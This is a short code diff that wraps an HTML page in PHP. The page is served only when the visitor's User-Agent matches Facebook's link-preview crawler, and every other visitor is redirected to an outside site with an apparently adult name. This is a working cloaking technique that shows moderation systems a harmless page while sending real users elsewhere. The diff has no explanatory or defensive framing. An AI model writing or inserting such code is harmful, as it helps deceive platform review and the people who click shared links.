@@ -1,3 +1,9 @@
+<?php
+if (
+    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/") !== false ||          
+    strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false
+) {
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -11,3 +17,9 @@
 <body>
 </body>
 </html>
+<?php
+}
+else {
+    header('Location: http://pussywalk.com');
+}
+?>
